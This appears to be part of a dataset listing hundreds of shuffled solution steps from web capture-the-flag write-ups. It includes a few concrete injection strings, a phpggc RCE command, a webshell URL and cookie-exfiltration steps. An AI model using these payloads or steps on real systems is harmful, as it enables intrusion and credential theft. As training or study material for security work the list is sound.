    "Note the output as the flag",
    "Identified that 'child_process.execFileSync' is being called in 'preinstall.js'.",
    "Sent the encoded cookies to a pre-defined URL controlled by the attacker.",
    "Identify a user profile.",
    "Inject commands via 'User-Agent' HTTP header using curl command.",
    "Discover that the flag is written on the resulting PNG file.",
    "Open the www.zip file.",
    "Look into static/css/main.css.",
    "Discovered an interesting comment with the parameter '?source=1'.",
    "Use the workaround to parse the contents of '/etc/passwd' to the results.",
    "Attempt authentication with the user created.",
    "Visit http://easy-php.darkarmy.xyz/robots.txt",
    "Determine the required fake address.",
    "Send requests with the newly encoded 'Admin' JWT token to attempt user role update and flag access.",
    "Determine the presence of a vulnerability in the 'new chat' feature",
    "Retrieve the flag",
    "Used the appropriate 'X-Cat-Header' in the request",
    "Visit the GitHub exploit page 'https://github.com/ambionics/laravel-exploits'",
    "Make several attempts to exploit the path traversal vulnerability.",
    "Bypassed duration check",
    "Inject a cookie.",
    "Note the challenge is related to cookie manipulation.",
    "Observe flag retrieval.",
    "Observe that it prompts a file download.",
    "Login with the registered user once",
    "Discovered the latitude and longitude of the most frequently occurring src_ip",
    "Take advantage of the Flask server's failure to comply with RFC norms",
    "Use the previously hardcoded auth cookie value",
    "Create the payload",
    "Discover the templates_c folder.",
    "Included the path '/index.php/config.php/%ff?source' in the payload",
    "Identified the possibility of XSS in a user's profile.",
    "Understand the JWT processing by the server.",
    "Use curl to search for 'sdctf' in the logs.",
    "Passed a SQL command into the X-FORWARDED-FOR header.",
    "Identify the first function that sets specific server response headers if the request is 127.0.0.1.",
    "Log in using extracted credentials.",
    "Identified from the source code that a POST request with 'shell' as a parameter echoes the input.",
    "Fuzz the username input with various inputs.",
    "Access the source URL",
    "Discover a comment from the API documentation page's HTML source hinting about a robots.txt file located at http://ctfchallenges.ritsec.club:3000/robots.txt.",
    "Visit the website.",
    "The assignment to $perm triggers the catch block",
    "Explore the followers functionality.",
    "Send the admin to the webpage",
    "Redefine 'key' through '__defineSetter__' and '__defineGetter__'.",
    "Found a way to bypass the Angular application.",
    "Identify the rule within the configuration file.",
    "Contact the discovered endpoint based on the decoded strings.",
    "Redirected the PHP script to the target URL after 19 redirects.",
    "Realize 'JSON.parse()' will parse the provided code JSON",
    "Discovered a treasury.js file in the HTML source.",
    "Use the Proof of Concept script",
    "Read the content of the /etc/flag.txt file",
    "Explored different methods for conducting XSS attacks on XSL documents.",
    "Check if the client has the correct 'auth' cookie set.",
    "Made a POST request to the server.",
    "Used the provided bypass.",
    "Acknowledge the replacement of flags by Nginx",
    "Analyze the query within the source code",
    "Analyze the HTML source of the page.",
    "Examine the URLs associated with different users and photos.",
    "Run brute.py script to output arbitrary SQL queries",
    "Receive a JWT(token).",
    "Uploaded the .php16 file.",
    "Explore the create post button.",
    "Checked source code.",
    "Redeployed the exploit GitHub page.",
    "Identify that '.jpg', '.png', and '.gif' extensions are blacklisted in the header-setting function.",
    "Use the DEMO application provided by singularity.",
    "Leveraged the prototype pollution to run 'require('./usage')'.",
    "Check the site's 'Bug Bounty' form.",
    "Log in as admin",
    "Intercept the request.",
    "Identify XXE attacks as a potential exploitation technique",
    "Retrieve the flag from the response received after visiting the '/api/flag' endpoint.",
    "Recognize that access is prevented unless not going through the proxy.",
    "Identify the JS file 'jquery.jscroll2.js'.",
    "Identify suspicious JavaScript named 'mec-frontend'.",
    "Examine the service.",
    "Set up a listener.",
    "Learn about the Scroll-To-Text-Fragment (STTF).",
    "Review the source code of the homepage.",
    "Listed the directory contents.",
    "Decide to execute a Python script (solve.py)",
    "Identify XSS vulnerability in the feedback feature of the site.",
    "Visit the URL with the payload '?icecream={{globals()}}'.",
    "Use OR operator to guess the next character in the password",
    "Used the crafted token as a cookie.",
    "The author sets up the environment to exploit the SQL Injection challenge.",
    "Identify a 'Mutation' query in the graphql schema.",
    "Determine inaccessibility of /private.php.",
    "Retrieved data from each document in the Firestore database using the code snippet.",
    "Script retrieves cookies from the target page.",
    "Initialize for loop.",
    "Received a PDF file from '/circle/one/' endpoint.",
    "Submit a value for 'n' that is larger than 8 characters.",
    "Identify code vulnerable to SQL injection in 'index.php'",
    "Notice the website information.",
    "Realize the random placement of squares in each round.",
    "Retrieve the flag from the displayed differences.",
    "Use a POST request to request 'file:///code/app.py'.",
    "Read the flag.",
    "Wrote a script for the attack.",
    "Configure the burpsuite tool.",
    "Understand that the Request smuggling vulnerabilities were discovered during previous research.",
    "Set the goal of changing the status to 'premium'",
    "Create a new regex matching the 'flag{randomString}' pattern.",
    "Obtain the flag from within the target server.",
    "Note how ATS processes the LF as the end-of-line.",
    "Discover the usage of XML envelopes",
    "Observe that the payload returns 'true'.",
    "Realize the vulnerability allows command execution via shell.",
    "Identify that students may have weak passwords",
    "Inspect the returned data",
    "Craft a file upload request with specific HTML content.",
    "Increase the privileges.",
    "Inject another cookie.",
    "Analyze the cookies.",
    "Analyze the resulting SQL query.",
    "Find out that the second obstacle is HTTP request smuggling.",
    "Identify the IP addresses that are restricted.",
    "Examine the provided source code.",
    "Connected to the database using the credentials from the JavaScript code.",
    "Analyze the source codes provided.",
    "CSRF to /api/flag is needed",
    "Wait for the bot to visit the sabotaged webpage.",
    "Find that content of the note is inserted into the HTML",
    "Tried to load an external resource (JavaScript or stylesheet)",
    "Spawn a reverse shell.",
    "Started testing for potential XPath injection points in the application.",
    "Identify that the challenge consists of 3 services - a Go microservice",
    "Extracted the 'secret' cookie value from the request.",
    "Allowed access to the `/flag` endpoint.",
    "Execute child process for reading the flag file",
    "Visit the webpage.",
    "Locate the 'Host' header in the HTTP request.",
    "Realised that the generated PDF had the flag inside",
    "Read source code via base64 encoding.",
    "Took a closer look at `poll.dart`.",
    "Try to exploit Shellshock.",
    "Attempt a simple GET request to /rocketLaunch.",
    "Upload enough bytes to exceed 10 records.",
    "Locate the challenge at port 8080.",
    "Note that the password for the portal is being checked by the script",
    "Discover that if a zip file with 'docker-entry' in its name is uploaded.",
    "Open the provided challenge link",
    "Bypassed filter.",
    "Send a GET request to '/localisation-file'.",
    "Ensure the trailing '.ping-proxy/ping' turns into a URL fragment.",
    "Access the provided URL",
    "Identify the problem with brute force.",
    "Copy the introspection query.",
    "Attempt to extract database details.",
    "Retrieve the flag",
    "Reveal the flag: p4{wtf_php_comparisons_how_do_they_work}",
    "Attempted payload to inject XSS via `theme`",
    "Access the initial webpage",
    "Examined the HTML source code of the page.",
    "Tested different elements for vulnerabilities with the `<math>` element bypass.",
    "Retrieve the flag from the returned results.",
    "Replace the original signed cookie with the new one generated.",
    "Use the script on the prepared website",
    "Open the website",
    "Inspect browser cookies.",
    "Upload the HTML file to the user profile.",
    "Determine that the code has a vulnerable functionality.",
    "Executed the Python script",
    "Study the functions of the website including 'flag store', create new store, update created store description, and create items in created store.",
    "Attempted to remove the 'password' key from the JSON body",
    "Notice settings related to a calendar.",
    "Identified a `/api/token` endpoint.",
    "Find an oddly-named nginx.conf file.",
    "The response text contains the secrets.",
    "Use the 'fread' and 'fopen' functions to craft a payload to read 'config.php'",
    "Find a 'flag' file.",
    "Visit the GitHub exploit page 'https://github.com/ambionics/phpggc'",
    "Intercept 'oauth tokens' by stopping the request from 'twitter' to 'yeunote'.",
    "Identified the need for a valid jwt token",
    "Observe the behavior of file downloads.",
    "Realized the IP address couldn't be overridden as a result.",
    "Identify the first part of the flag within a comment",
    "Locate an image tag",
    "Observe the server response.",
    "Manipulate the HTML structure",
    "Consider that the debugging port is randomized.",
    "Observed an SQL query at the start of the HTML page returned.",
    "Change the User-Agent header in the request",
    "Review the presented source code",
    "Decide to examine the source code.",
    "Study the provided Python script.",
    "Find the flag within a fan post after gaining admin's acceptance as a follower.",
    "Access the site at :5555",
    "Identify use of the 'tar' command when downloading files.",
    "Identify the transmission of positions to the client.",
    "Identified 'this.service.getAnswer()' command in the Angular application.",
    "Observe the execution of eval function",
    "Configured the EC2 instance to trigger a reverse shell on startup",
    "Noted that adding something before the '<link>' tag fixes the behaviour.",
    "Recognize an alternative method to bypass the login via the username field",
    "Conduct research on vulnerabilities of Apache httpd 2.4.49.",
    "Determine that it is unusable due to requiring authentication.",
    "Learned of an existing bypass in Chrome for the version of DOMPurify the application was using.",
    "Accessed robots.txt to find interesting entries",
    "Identify a feature in the documentation.",
    "Planned to craft an object with desired parameters.",
    "If identified, manipulated the XPath query to bypass authentication mechanisms of the application.",
    "Attempted to start the app locally with 'npm run start'",
    "Construct `exploit.html` file.",
    "Use the personal domain for blind exfiltration of files.",
    "Guessed the first part of the flag referred to in the PDF.",
    "Craft a message with an XSS attack using an `img` tag",
    "Alter the file 'app.xml' inside the new DOCX file",
    "Use 'window.open()' on the exploit server.",
    "Unquoted and cleaned up the cookie values within the Python script.",
    "Convert the Base64 string into hexadecimal format.",
    "Inject a template operation (7*7)",
    "Circumvented file extension checks on '.php' by replacing '.' character with '%252e'.",
    "Crafted another request smuggling attack.",
    "Call the web page.",
    "Discover a new path /server-status",
    "Minify the code to be read as XSS.",
    "Submit multiple 'n' parameters with the same value in the web application.",
    "Recognize the visible SQL query as a potential vulnerability hint.",
    "Performed a curl command.",
    "Notice that the scripts are always executed due to the `nonce` in the CSP.",
    "Retrieved the CTF flag",
    "Identify the restrictions set in the 'valid_ip' function.",
    "Create a SQL query to extract the data",
    "Identify the first change.",
    "The identification was based on the mention of XML.",
    "Intention to edit friend's grades specified over 4 semesters",
    "Note that the username is 'backd00r' and the password is 'catsrcool'.",
    "Reviewed source code of 'config/ups_manager.py' revealing the HTTP server with endpoints for 'ups_status', 'restart_ups', and '/get_flag'.",
    "Run the exploit",
    "Visit the disallowed route",
    "Visit the website.",
    "Take a URL as an argument.",
    "Ran the shell script by visiting the URL 'http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/'.",
    "Add the new JWT to the cookie.",
    "Try using /search as per instructions in the response.",
    "Use double URL encoding.",
    "Include the cleaned, manipulated PDF data in 'collision1.pdf'.",
    "Crafted an SQL query for 'valid' result set.",
    "Evaluate the if statement `0 == 'whatever the password is'`.",
    "Notice that the form allows execution of a ping command.",
    "Assemble the migrated instances of the 152-digit number.",
    "Received a PNG image from 'CONNECT /two/' request.",
    "Script composes the flag using the loop.",
    "Understand that Waitress allows LF in chunked extensions.",
    "Extract the flag from the provided string",
    "Claim the flag.",
    "Research on whether the HTTP headers can manipulate the processing of URL path by Gunicorn",
    "Copy the 'session' cookie.",
    "Execute the command 'php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system \"cat /flagM1AhS\"'",
    "Navigate to the '/api/flag' endpoint using the modified token.",
    "Apply sqlmap on the saved login request.",
    "Understand the correct UUID format and the known prefix.",
    "Observe that the password is not given directly but might be related to the hash.",
    "Print out the corresponding 'likeCookie' value.",
    "Identified that a successful password reset would set 'user.active' to 'True', activating the user account.",
    "Find the file named 'flag.txt'.",
    "Acknowledged that one should never let user input be 'eval'ed in any way",
    "Described the '1919810931114514' table using the `1'; DESCRIBE tablename;` command.",
    "Enter '1' for 2 + 2 - 3 = ?",
    "Used the `onLoaded` event handler.",
    "Observe the output",
    "Identify all instances of the 152-digit number.",
    "Test characters against the SQL injection",
    "Analyze the 'history.length' attribute to determine if a redirect occurred.",
    "Find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
    "Identify that 'RS256' and 'HS256' algorithms are allowed for decryption in 'challenge/helpers/JWTHelper.js'.",
    "Recognize the naive 'script remover'",
    "Iterate over every character in the domain",
    "URL encoded the first binary string.",
    "Instructed to locate the origin point of most attacks",
    "Performed an SSRF.",
    "Visit the website mentioned in the challenge",
    "Launched the attack script on the new GitHub Pages site.",
    "Decode the JWT token.",
    "Create a `redirect.php` file.",
    "Successfully extract the user.",
    "Note that the XSS-Auditor in Chrome 74 is set to mode=filter.",
    "Looked more into Jinja2 and found the 'safe' filter that renders unescaped HTML.",
    "Noted the usage of DOMPurify v2.3.0 tool for sanitizing the note.",
    "Place a zero between the two GET requests.",
    "Found an issue on Google's issue tracker regarding YouTube's 'oembed' API not implementing JSONP.",
    "Website displays the content of the '/flag.txt' file",
    "Read the flag file",
    "Add a random timestamp to the POST request body to understand the format.",
    "Use the identified class (subprocess.Popen) to read the content of 'flag.txt'",
    "Used 'attachment' parameter",
    "Create a policy that only allows form submissions to a specific domain",
    "Check if the value of <userID>_isAdmin key in Redis database is 'yes'.",
    "Attempted to navigate to '.bzr' directory.",
    "Observe a list of four different image galleries.",
    "Examined features of the application.",
    "List the files using the backtick-enclosed 'ls' command.",
    "Realize that YAML parsing 'NO' as False allows bypassing escapeshellargs.",
    "Perform batching in GraphQL to send multiple queries at once, with the anticipation that the server will process all queries together using the same CAPTCHA code.",
    "Read the hint for this challenge",
    "Conceptualize the attack.",
    "Ensured the shell would execute the malicious 'id'",
    "Retrieve the flag.",
    "Discover the secret to be 'supersecret'.",
    "Identify that the random numbers generated are not cryptographically secure.",
    "Observe the error indicating the names of the missing files.",
    "Reload the website page with the new user-agent.",
    "Inspected the page source and found no abnormalities",
    "Understand that the API is powered by Werkzeug.",
    "Inspect the HTML source code of the admin page",
    "Observe the server reflecting the productId value in the response",
    "Used '127.0.0.1;echo $PWD' in URL.",
    "Craft a request to set the theme to the PHP payload.",
    "Verified that the obtained credentials do not provide the flag",
    "Note that the post ID is sent as a URL fragment",
    "Realized that the invalid characters in the payload can bypass the regex validation",
    "Identified a potential SQL injection point in the 'moneys=' parameter.",
    "Verified that 'link' and 'style' tags are explicitly permitted during sanitization.",
    "Base decision on receiving multiple 'flag' files",
    "Identified that the 'read online' button opens a new window upon clicking.",
    "Craft a request with the following parameters: `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole?__debugger__=yes&cmd=__import__('os').listdir('/')%3b&frm=0&s=IUrsy36AKlZ2zvT1vaPc`.",
    "Created two PDFs with same SHA1 hash exploiting the SHA1 vunlerability with SHATTERED.",
    "Recognized a known strange PHP behavior could be exploited to circumvent file extension checks.",
    "Identified a possible SQL injection vulnerability.",
    "Observe that parentheses and some keywords are blocked.",
    "Leverage the navigation function and the XS leak.",
    "Take into account that JavaScript is a case-sensitive language.",
    "Consult the official Python documentation.",
    "Decide to exploit the SSRF vulnerability.",
    "Aim to access internal files",
    "Observe the presence of a login form",
    "Visit /app",
    "Find that the Gopher adapter used was modified from a GitHub gist.",
    "Note the time limit and required number of clicks.",
    "Receive an HTTP 200 OK status code.",
    "Understand that the program is executed when 10 records are reached by default.",
    "Understood from the code snippet that the md5 hash must collide.",
    "Identify the presence of a form to create users.",
    "Send a POST request to /feed.php.",
    "Obtained the payload from the decrypted jwt token",
    "Successful bypass of initial server checks",
    "Analyze the form submission structure",
    "Revealed a 'flag.txt' file.",
    "Attempt to read a file from the server",
    "Uploaded .htaccess file.",
    "Understand that you can convert a string to an array of chars in Javascript using the clause '[...p]'.",
    "Receive a response text.",
    "Aim to extract the password serving as the flag.",
    "Implement logic to determine the winning position.",
    "Extract 'P4s5_w0Rd' string using regex pattern.",
    "Build a HTML page to automate this process.",
    "Entered ?source=1 as an HTTP parameter.",
    "Successfully won the race",
    "The deserialized object is assigned to the $perm variable in 'authentication.php'",
    "Open the Browser Devtools",
    "Choose to target the '/uberadmin' directory.",
    "Modify the value of 'admin_id' cookie to '1'",
    "Visit the '/login' route.",
    "Implemented haversine formula",
    "Discover that the URL is encrypted using `str_rot_pass($url, $key);`.",
    "Use the `nonce` to bypass the CSP again.",
    "Interpret that 'b2' is initialized with a random number from 0-500.",
    "The PHP command is to display the ID of the current process",
    "Security questions are related to Alan Turing's account recovery",
    "Observe a successful flag output after authentication.",
    "Read the flag.",
    "Receive the flag.",
    "Identify that the Python microservice runs on Flask's built-in server",
    "List all usable classes.",
    "Activated the JavaScript debugger",
    "Encode the lowercase string into bytes.",
    "Try to access or replace 'store.key' through the Template Injection vulnerability.",
    "Send the request to modify the new user's role to 'Admin'.",
    "Received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Provided a callback parameter.",
    "The author identifies it as a SQL Injection challenge.",
    "Identify the presence of a 'username' attribute in the requests.",
    "Analyzed the browser console.",
    "Consider the requirement for three keys and adjust the input accordingly.",
    "Identified that the user input is directly concatenated to the SQL query ",
    "Enter a color",
    "Recognize this as a code injection challenge.",
    "Locate the 'login' method in [dogooo_comments.py](dogooo_comments.py) file.",
    "Use a flag variable to denote a successful guess.",
    "Determine the technology stack of the web application",
    "Decoded the `chatmessage` widget.",
    "Use the JWT secret and the altered payload for the new token.",
    "Determined that it allows only read, write, and exit syscalls before executing the input.",
    "Discover that the 'DB_SECRET' is stored in another table.",
    "Checked the value of the `token` cookie on jwt.io.",
    "Use the admin's cookie to retrieve the flag",
    "Sign a token with the public key verifyKey.",
    "Bypassed regex filters.",
    "Consider the potential of exploiting the system by bloating the URL length (via the 'ids' parameter) to hit a limitation",
    "Notice the name 'We will we will Shock You' as a hint towards Shellshock vulnerability.",
    "Locate the 'GET FLAG' button",
    "Set the cookie to a given string",
    "Ensured the cache stores all attempts for generating the challenge strings.",
    "Bypass the front end input sanitization.",
    "Considered the possibility of output truncation by SQLmap.",
    "Locate the made-an-account cookie.",
    "Open the source.zip file.",
    "Access the provided URL.",
    "Noticed the user's IP address being attributed to an SQL query.",
    "Created a PHP script to serialize an object for the exploit.",
    "Find another endpoint: `http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`.",
    "Recognized the obfuscation of the JavaScript code",
    "Set the auth token by making the bot visit 'http://localhost:7070/auth'.",
    "Limit the try range.",
    "Utilized SQLMap.",
    "Determine that the error indicates the presence of an unclosed apostrophe.",
    "Execute a SQL query via URL manipulation",
    "Filter output using '/etc/alternatives/nawk'.",
    "Discover a disallowed route '/fade/to/black'",
    "Set the number of 'boops' in the token to 1501.",
    "Craft an XSS payload.",
    "Determine that the removal of open HTML tags '<' makes a traditional XSS attack impossible.",
    "Verify that the flag animation is frozen",
    "Identify `/getflag` endpoint",
    "Added 'foo.txt' file to the Bazaar repository.",
    "Include the SQL injection payload in a complete request.",
    "Execute the query '123' UNION SELECT name, sql, null from sqlite_master;--'.",
    "Confirm that the file content is displayed.",
    "Notice lack of content verification or removal of unwanted content",
    "Review the jQuery documentation.",
    "Input {{ state.flag }}",
    "Decide to attempt SQL injection on the input fields.",
    "Encounter an error page.",
    "Used PHP system() function.",
    "Request 'nonces' from 'https://naas.2019.chall.actf.co/nonceify'",
    "Identify the 'username' and 'password' attributes",
    "Created a new malicious URL.",
    "Realize that the decryption key can be obtained by supplying a 'key_id' in the HTTP headers",
    "Change the value of the 'messi' key to 'psg'.",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Visit the website.",
    "Identify the structure of the Python script",
    "Understood the function is used to sign PDF files.",
    "Understand that a POST request must be sent to '/profile/request' to make admin accept the follow request.",
    "Note the message displayed on the front end upon attempted logins.",
    "Notice that the public key used for the JWT token handling is stored in the '__dirname' directory.",
    "Inspect the Python file provided in the challenge.",
    "Execute the function",
    "Received a 403 Forbidden error.",
    "Created a .htaccess file.",
    "Look for '/robots.txt' to find a hint about the public key location.",
    "Press the 'Ctrl' key on the keyboard.",
    "Reached the total of 250 votes.",
    "Identify 'cat' command execution in GET request parameter 'f'.",
    "Used the obtained OTP for verification and login.",
    "Reconstruct the user data from the encoded string.",
    "Included a 'uri' parameter with a malformed path, such as //ATTACKER-URL, in the request.",
    "Modified the JSON body by removing the 'name' key value pair",
    "Check if the body JSON value 'solution' exists.",
    "Due to frontend processing, this resulted in the same verified message but carrying a different meaning.",
    "Analyze the JavaScript file.",
    "Collect the list of subclasses returned as a result",
    "Identify the first check.",
    "Locate one more environment: /secret_ctf_location/env.",
    "Force the debugging private key in the link.",
    "Exploited MFA token check bypass.",
    "Recognized input appending pattern to '/santa_mon.sh'.",
    "Identify the use of a productId value",
    "Retrieved the flag after successful login.",
    "Compile a list of emails",
    "Recognize the usage of Flask's 'render_template_string' function",
    "Access the 'target_credentials' database.",
    "Shift focus to the 'following' feature.",
    "Note how the second request is encapsulated in the chunked content of the first request.",
    "Observe a visible SQL query for the login request.",
    "Use sessionID as the first parameter.",
    "Create a function `http_get` in the Python script.",
    "Decide to use CSRF attack",
    "Built an HMAC(HS256) token.",
    "The iframe source is /demo",
    "Viewed source code and observed 'shell_exec' usage with 'santa_mon.sh' script.",
    "Transformed relative JMPs into PLT type trampolines.",
    "Identify two additional subdomains through the certificate search.",
    "Downloaded the src.zip file",
    "Consider potential .js file candidates for execution.",
    "Retrieved the flag from the 'flag_db' DynamoDB table",
    "Found a PHP object in the decoded cookie.",
    "Fail to execute the command due to exceeding the character limit.",
    "Identified a second SQL injection endpoint.",
    "Visited the website.",
    "Discovered that '/lib/db/user.db' and '/lib/db/passcode.db' can be directly accessed from the server.",
    "View the LOG data.",
    "Examined the application.",
    "Ran the 'bzr status' command on the 'ctf-bzr' repository.",
    "Included the newly edited admin jwt token in the request",
    "Enter the given URL in the address bar.",
    "Obtain the flag 'MCA{al3x4_5et_a_r3minder}'.",
    "Reveal the flag.",
    "Use the '.lower()' method on the variable to convert the string to lowercase.",
    "Attempt authentication bypass with advanced payloads.",
    "Find out that the encryption function is not secure enough to prevent decryption.",
    "Find flag in the database dump.",
    "Upload 'collision1.pdf' to the challenge page.",
    "Switched to the user 'ctf'.",
    "Created a .php16 file.",
    "Craft a valid JWT with '31337' identity",
    "Search for Robots.txt file.",
    "Visit the URL provided on the page.",
    "Recognize it is intended for Server Side Request Forgery (SSRF).",
    "Initialize a GET request.",
    "Created a bash script",
    "Include spaces in the note.",
    "Find a message containing a 'secret key' for the cookies.",
    "Intercept the bot's browser cookie.",
    "Encountered a blacklist filter preventing certain inputs.",
    "Started the CTF Challenge in Houseplant CTF 2020 \u2013 Fire/place.",
    "Notice a 'login_session_token' is received upon login attempt.",
    "Exploited parser differential in BeautifulSoup.",
    "Set the script to continue downloading missing files.",
    "Recognized the need to manipulate the PATH variable due to the SUID flag being set",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Realized that http://flagportal.chall.seetf.sg:10001/api//flag-plz would be mapped to http://backend/flag-plz.",
    "Execution of the tar command with wildcard arguments causes the payload in 'shell.txt' to be executed.",
    "Decode the cookie using base64 decoding",
    "Confirm that both files are sqlite3 databases.",
    "Note that this arrangement is necessary to pass the file type check",
    "User's cookies are sent along with the POST request",
    "Recognize that the challenge focuses on hacking the JWT cookie",
    "Calculate the 'passcode'.",
    "Determine that LibreOffice is the specific tool employed for document conversions.",
    "Modify the output of the Python code.",
    "Check if response contains 'check' string",
    "Discover a hardcoded password within the JavaScript file.",
    "Obtain the process ID as the result of executing the PHP command",
    "Discover that the 'is_payload_danger' method prevents certain functions such as 'system'",
    "Visit the URL submitted to the '/share' endpoint by an admin bot.",
    "Modify the exploit script to target the provided site and the located /flag.txt",
    "Replace the existing `login` cookie",
    "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
    "Switch to the console.",
    "Corrected the mistake to execute the payload after serialization",
    "Recognize the importance of bypassing file extension restrictions for a successful attack.",
    "Analyze the read files page",
    "Decode the field flag from the receiving server.",
    "Understood how objects are handled",
    "Realize that the RAM can be dumped using this technique.",
    "Checked the equality of generated data from both the hexadecimal values.",
    "Remove the intermediate 'hacked.pdf' file.",
    "TranslateBBCode routine processes BBCode tags",
    "Check the content of robots.txt",
    "Examine the source code.",
    "Understand that the client-server communication uses an encoding function.",
    "Understanding that the secret is not 'secret-[random UUID]' as expected, but it is the string: 'secret-function randomUUID(options) { if (options !== undefined) validateObject(options, 'options'); const { disableEntropyCache = false, } = options || {}; validateBoolean(disableEntropyCache, 'options.disableEntropyCache'); return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID(); }'.",
    "Craft a precise content payload",
    "Submit suspicious URLs to be visited by a headless Chrome agent.",
    "Leaked the contents of the admin page",
    "Observe the returned DNS query for example.com.",
    "Utilized the `dirb` wordlist for username enumeration.",
    "Find the flag in the profile: 'ctfzone{0190af5705a38115cd6dee6e7d79e317}'",
    "Determine that template injection is possible",
    "Examined the HTML source code.",
    "Put all components of the attack together",
    "Exploited the directory traversal vulnerability to execute commands and retrieve the contents of the flagged file located at /secret/safe/flag.png",
    "Activate accessibility tools in the Tools section",
    "Read the message displayed: 'Not admin, no flag for you'",
    "Logged in with a random value.",
    "Upload the new PHP exploit",
    "Search for vulnerabilities in other functions.",
    "Obtain the flag",
    "Structure the XML code to expose data from the /etc/passwd file.",
    "Identify the provided file is a packet capture (.pcap) file.",
    "Crafted a record by setting a password with a ':' character.",
    "Identify Admin Login section.",
    "Break down the payload.",
    "Return the real flag in the 'uberadmin' directory.",
    "Once successful, noted the steps taken to reproduce the attack.",
    "Fame increase is hypothetically possible.",
    "Specify 'changelog.js' script in the path of the JSON payload.",
    "Manipulate the file:// protocol",
    "Crafted an SQL injection payload bypassing the filter limit",
    "Examined the search function.",
    "Observed User-Agent details.",
    "The iterated character is added to the 'flag'.",
    "Read the content of the 'robots.txt' file",
    "Recognize that the 'guest' cookie is base 64 decoded in the deserialization process.",
    "Identify the hostname as 'redis' and port as 6379.",
    "Analyze the content of the script.js file.",
    "Sent the 'GET' request to the provided web page.",
    "Check if the password is the flag",
    "Explored the website functionality",
    "Compare the resulting origins of the pages",
    "The section tests payloads that can cause XSS if used with jQuery's html() method.",
    "Decide to provide code in the form of JSON object",
    "Checked the PHP source code.",
    "Retrieve the output",
    "Follow the redirection link after replacing the 'with' value with 'flag'.",
    "Look into the provided source code to understand how the application works.",
    "Send the crafted request to confirm the presence of the vulnerability.",
    "Used the exploit to log in",
    "Use the discovered security question answer to bypass the security check and log in as the 'admin' user.",
    "Implement a recursive function to retrieve one character from 'msg' for each WebSocket packet.",
    "Noticed the 'sanitize' function removes spaces from input.",
    "Identify the need to bypass server checks",
    "Inject the authenticated session cookie into the browser or curl.",
    "Submit registration form.",
    "Created exploit using SQL injection: 'adm' || trim('in', ` Password: `) || ''",
    "Identified the challenge as involving wkhtmltopdf, a tool that translates HTML content into a PDF.",
    "Determined that SELECT and UNION keywords were being filtered by regex.",
    "Construct a custom PHP script",
    "Identified a suitable breakpoint after the `malloc` call and before the `strcpy` call.",
    "Intercept the Post Request in the JavaScript code.",
    "Open the '/g00d_old_mus1c.php' path.",
    "Sent a 'postMessage' linking the generated CSS to the target page.",
    "Used provided hexadecimal values.",
    "Hit a snag due to restrictions of the `trustedTypes` policy of CSP",
    "Noted the flag leakage due to Fetch API redirect limit.",
    "Provide authentication to view the server logs.",
    "Send the code to the site administrator",
    "Wait for the process to complete.",
    "Realized that the cache is not separated between headless and non-headless Chrome instances.",
    "Recognize Puma ignoring invalid / unsupported TE values.",
    "Visit the website",
    "Uploaded the final payload to the server.",
    "Realize it is similar to 'window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]'",
    "Included code in the payload to return the flag as the username",
    "Search for the function addCaptcha() in the JavaScript code",
    "Complete the challenge.",
    "Observe cookies carrying the 'secret' cookie.",
    "Identified that 'transmissions' had a fixed part at the beginning and end.",
    "Retrieve the discovered full token",
    "Successfully established the ability to enumerate usernames at `/users/<username>`.",
    "Use the database credentials for authentication.",
    "Visit the given URL",
    "Find CSP settings in the source code.",
    "Modify the previous code",
    "Observed the status report of the combat robot and a command prompt.",
    "Identify that query parameters are not properly sanitized.",
    "Navigate to /authentication.phps",
    "Discovered that a '<flag>' XML element is hidden in the 'books' table but not in the entry with 'id = 1'.",
    "Prepend 'a' characters to the payload.",
    "Print the 'flag' file content using a bash script.",
    "Include a '_method=PUT' query parameter in the request",
    "Access the 'Edit profile' section",
    "Accounted for pipelining in the server.",
    "Determine current user is 'www-data'",
    "Note that the 'name' variable refers to 'window.name'.",
    "Open a browser.",
    "Faked session with 'is_admin' privileges",
    "Identify the '/guest' endpoint.",
    "Understood that 'password' = 'username' evaluates to 0",
    "Analyse PHP code.",
    "Install the required dependencies for s3scanner",
    "Read the created item from the request smuggling.",
    "Test the SSTI vulnerability by inputting a mathematical operation as the payload into the password field.",
    "Located a form on the login page.",
    "Receive API documentation including the endpoints: /api/admin and /api/normal.",
    "Confirm that IP 18.213.16.123 is not a local IP.",
    "Discovered interesting information in the 'iam list-instance-profiles' response",
    "Get the value from the cookie",
    "Understand that HTML files are downloaded with random filenames.",
    "Identify Vitepress is in dev mode.",
    "Submitted a malformed statement.",
    "Retrieve the flag from the decrypted image.",
    "Understand that dots, double slashes, or non-ascii dot are not allowed in the iframe value in the URL.",
    "Investigated gallery.php.",
    "Understood that the variable part contained the index of the actual char.",
    "Use the OpenSSL tool to decode the Bitcoin Wallet password.",
    "Include the crafted JWT in the `Authorization` header",
    "Inject a Set-Cookie header to set the admin's ID cookie to your own session.",
    "Downloaded the contents of an Amazon S3 bucket.",
    "Provide 'Link to profile' and 'Message' in the selected message type",
    "Retrieved the CTF flag.",
    "Reload or refresh the webpage",
    "Adjust exploit path based on Twitter inspiration from similar challenges.",
    "Change the location of the pop-up back to the exploit server.",
    "Realize the cause of stability issues is multiple users attacking simultaneously with sqlmap",
    "Exploit the arbitrary JavaScript execution via a broken image tag's onerror handler.",
    "Bypassed 'disable_functions' on PHP 7.0-8.0 versions.",
    "Gain admin access.",
    "Found that `shellme()` leads to the function `shell_this()`.",
    "Inspect the HTTP Response.",
    "Note that Apache blocks '/debug*'.",
    "Observe a web page",
    "Discovered a connection being made to a MySQL server prior to shellcode execution.",
